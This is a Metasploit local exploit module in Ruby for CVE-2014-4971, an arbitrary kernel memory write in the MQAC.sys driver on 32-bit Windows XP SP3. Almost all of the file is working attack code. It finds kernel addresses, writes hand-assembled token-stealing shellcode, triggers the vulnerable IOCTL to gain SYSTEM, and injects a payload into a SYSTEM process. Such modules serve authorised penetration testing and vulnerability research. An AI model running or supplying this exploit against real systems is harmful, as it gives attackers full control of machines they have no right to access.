##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'MQAC.sys Arbitrary Write Privilege Escalation',
      'Description'    => %q{
        A vulnerability within the MQAC.sys module allows an attacker to
        overwrite an arbitrary location in kernel memory.

        This module will elevate itself to SYSTEM, then inject the payload
        into another SYSTEM process.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Matt Bergin', # original exploit and all the hard work
          'Spencer McIntyre' # MSF module
        ],
      'Arch'           => [ ARCH_X86 ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC'   => 'thread',
        },
      'Targets'        =>
        [
          [ 'Windows XP SP3',
            {
              '_KPROCESS' => "\x44",
              '_TOKEN' => "\xc8",
              '_UPID' => "\x84",
              '_APLINKS' => "\x88"
            }
          ],
        ],
      'References'    =>
        [
          [ 'CVE', '2014-4971' ],
          [ 'EDB', '34112' ],
          [ 'URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-003.txt' ]
        ],
      'DisclosureDate'=> 'Jul 22 2014',
      'DefaultTarget' => 0
    }))
  end

  def find_sys_base(drvname)
    session.railgun.add_dll('psapi') if not session.railgun.dlls.keys.include?('psapi')
    session.railgun.add_function('psapi', 'EnumDeviceDrivers', 'BOOL', [ ["PBLOB", "lpImageBase", "out"], ["DWORD", "cb", "in"], ["PDWORD", "lpcbNeeded", "out"]])
    session.railgun.add_function('psapi', 'GetDeviceDriverBaseNameA', 'DWORD', [ ["LPVOID", "ImageBase", "in"], ["PBLOB", "lpBaseName", "out"], ["DWORD", "nSize", "in"]])
    results = session.railgun.psapi.EnumDeviceDrivers(4096, 1024, 4)
    addresses = results['lpImageBase'][0..results['lpcbNeeded'] - 1].unpack("L*")

    addresses.each do |address|
      results = session.railgun.psapi.GetDeviceDriverBaseNameA(address, 48, 48)
      current_drvname = results['lpBaseName'][0..results['return'] - 1]
      if drvname == nil
        if current_drvname.downcase.include?('krnl')
          return [address, current_drvname]
        end
      elsif drvname == results['lpBaseName'][0..results['return'] - 1]
        return [address, current_drvname]
      end
    end
  end

  # Function borrowed from smart_hashdump
  def get_system_proc
    # Make sure you got the correct SYSTEM Account Name no matter the OS Language
    local_sys = resolve_sid("S-1-5-18")
    system_account_name = "#{local_sys[:domain]}\\#{local_sys[:name]}"

    this_pid = session.sys.process.getpid
    # Processes that can Blue Screen a host if migrated in to
    dangerous_processes = ["lsass.exe", "csrss.exe", "smss.exe"]
    session.sys.process.processes.each do |p|
      # Check we are not migrating to a process that can BSOD the host
      next if dangerous_processes.include?(p["name"])
      next if p["pid"] == this_pid
      next if p["pid"] == 4
      next if p["user"] != system_account_name
      return p
    end
  end

  def open_device
    handle = session.railgun.kernel32.CreateFileA("\\\\.\\MQAC", "FILE_SHARE_WRITE|FILE_SHARE_READ", 0, nil, "OPEN_EXISTING", 0, nil)
    if handle['return'] == 0
      print_error('Failed to open the \\\\.\\MQAC device')
      return nil
    end
    handle = handle['return']
  end

  def check
    handle = open_device
    if handle.nil?
      return Exploit::CheckCode::Safe
    end
    session.railgun.kernel32.CloseHandle(handle)

    os = sysinfo["OS"]
    case os
    when /windows xp.*service pack 3/i
      return Exploit::CheckCode::Appears
    when /windows xp/i
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    if sysinfo["Architecture"] =~ /wow64/i
      print_error("Running against WOW64 is not supported")
      return
    elsif sysinfo["Architecture"] =~ /x64/
      print_error("Running against 64-bit systems is not supported")
      return
    end

    if is_system?
      print_error("This meterpreter session is already running as SYSTEM")
      return
    end

    kernel_info = find_sys_base(nil)
    base_addr = 0xffff
    print_status("Kernel Base Address: 0x#{kernel_info[0].to_s(16)}")

    handle = open_device
    return if handle.nil?

    this_proc = session.sys.process.open
    unless this_proc.memory.writable?(base_addr)
      session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ 1 ].pack("L"), nil, [ 0xffff ].pack("L"), "MEM_COMMIT|MEM_RESERVE", "PAGE_EXECUTE_READWRITE")
    end
    unless this_proc.memory.writable?(base_addr)
      print_error('Failed to properly allocate memory')
      this_proc.close
      return
    end

    hKernel = session.railgun.kernel32.LoadLibraryExA(kernel_info[1], 0, 1)
    hKernel = hKernel['return']
    halDispatchTable = session.railgun.kernel32.GetProcAddress(hKernel, "HalDispatchTable")
    halDispatchTable = halDispatchTable['return']
    halDispatchTable -= hKernel
    halDispatchTable += kernel_info[0]
    print_status("HalDisPatchTable Address: 0x#{halDispatchTable.to_s(16)}")

    tokenstealing  = "\x52"                                                        # push edx                         # Save edx on the stack
    tokenstealing << "\x53"                                                        # push ebx                         # Save ebx on the stack
    tokenstealing << "\x33\xc0"                                                    # xor eax, eax                     # eax = 0
    tokenstealing << "\x64\x8b\x80\x24\x01\x00\x00"                                # mov eax, dword ptr fs:[eax+124h] # Retrieve ETHREAD
    tokenstealing << "\x8b\x40" + target['_KPROCESS']                              # mov eax, dword ptr [eax+44h]     # Retrieve _KPROCESS
    tokenstealing << "\x8b\xc8"                                                    # mov ecx, eax
    tokenstealing << "\x8b\x98" + target['_TOKEN'] + "\x00\x00\x00"                # mov ebx, dword ptr [eax+0C8h]    # Retrieves TOKEN
    tokenstealing << "\x8b\x80" + target['_APLINKS'] + "\x00\x00\x00"              # mov eax, dword ptr [eax+88h]  <====| # Retrieve FLINK from ActiveProcessLinks
    tokenstealing << "\x81\xe8" + target['_APLINKS'] + "\x00\x00\x00"              # sub eax,88h                        | # Retrieve _EPROCESS Pointer from the ActiveProcessLinks
    tokenstealing << "\x81\xb8" + target['_UPID'] + "\x00\x00\x00\x04\x00\x00\x00" # cmp dword ptr [eax+84h], 4         | # Compares UniqueProcessId with 4 (The System Process on Windows XP)
    tokenstealing << "\x75\xe8"                                                    # jne 0000101e ======================
    tokenstealing << "\x8b\x90" + target['_TOKEN'] + "\x00\x00\x00"                # mov edx,dword ptr [eax+0C8h]     # Retrieves TOKEN and stores on EDX
    tokenstealing << "\x8b\xc1"                                                    # mov eax, ecx                     # Retrieves KPROCESS stored on ECX
    tokenstealing << "\x89\x90" + target['_TOKEN'] + "\x00\x00\x00"                # mov dword ptr [eax+0C8h],edx     # Overwrites the TOKEN for the current KPROCESS
    tokenstealing << "\x5b"                                                        # pop ebx                          # Restores ebx
    tokenstealing << "\x5a"                                                        # pop edx                          # Restores edx
    tokenstealing << "\xc2\x10"                                                    # ret 10h                          # Away from the kernel!

    shellcode = make_nops(0x200) + tokenstealing
    this_proc.memory.write(0x1, shellcode)
    this_proc.close

    print_status("Triggering vulnerable IOCTL")
    session.railgun.ntdll.NtDeviceIoControlFile(handle, 0, 0, 0, 4, 0x1965020f, 1, 0x258, halDispatchTable + 0x4, 0)
    result = session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)

    unless is_system?
      print_error("Exploit failed")
      return
    end

    proc = get_system_proc
    print_status("Injecting the payload into SYSTEM process: #{proc['name']}")
    unless execute_shellcode(payload.encoded, nil, proc['pid'])
      fail_with(Failure::Unknown, "Error while executing the payload")
    end
  end

end
